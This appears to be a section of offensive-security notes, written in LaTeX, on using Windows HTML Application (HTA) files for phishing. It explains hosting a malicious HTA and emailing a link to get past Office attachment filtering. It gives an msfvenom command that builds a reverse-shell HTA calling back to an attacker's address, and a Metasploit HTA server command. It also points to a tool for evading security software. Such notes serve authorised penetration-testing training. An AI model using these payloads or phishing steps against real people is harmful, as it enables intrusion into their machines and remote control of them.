\section{HTA}

\subsection{Introduction}
An HTA is a Windows program that combines HTML and scripting languages (such as VBScript and JScript). It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using \verb+mshta.exe+, which is typically installed along with Internet Explorer, making \verb+mshta+ dependant on IE. So if it has been uninstalled, HTAs will be unable to execute.


NOTE: During phishing we will host our hta file and use link in a phishing mail http://x.x.x.x/demo.hta . If you send hta file directly as an attachment, by default, Office has filetype filtering in place that will prevent you from attaching certain files to emails (including HTAs, which is why we'd opt to sending a link instead).

\subsection{Tools}

\subsubsection{Metasploit}

\begin{verbatim}
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta
\end{verbatim}

host the payload.

Metasploit \verb+HTA Web Server+:

\begin{verbatim}
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST <l_ip>; set LPORT <revshell_port>; set SRVHOST <l_ip>; set SRVPORT <srv_port> run -j"
\end{verbatim}

then send the link to paylaad provided by msfvenom


\subsubsection{GadgetToJScript}

\href{https://github.com/med0x2e/GadgetToJScript}{GadgetToJScript} offer more functionality to bypass security tools by generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA scripts.
